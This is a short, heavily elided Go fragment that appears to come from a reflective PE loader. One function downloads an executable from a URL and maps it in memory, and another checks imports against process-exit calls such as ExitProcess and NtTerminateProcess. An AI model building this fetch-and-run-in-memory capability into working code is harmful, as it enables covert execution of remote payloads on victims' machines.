...
func loadPeInternal(peBytes []byte) uintptr {
	...
	for {
		...
		for {
			...
			if funcName == "exit" || funcName == "ExitProcess" || funcName == "_exit" || funcName == "_Exit" ||
				funcName == "quick_exit" || funcName == "RtlExitUserProcess" || funcName == "NtTerminateProcess" ||
				funcName == "ZwTerminateProcess" || funcName == "TerminateProcess" {
...
func LoadPEFromUrl(url string, sleepSeconds int) (*Mapping, error) {
	...
	peBytes, err := transport.Download(url)
	if err != nil {
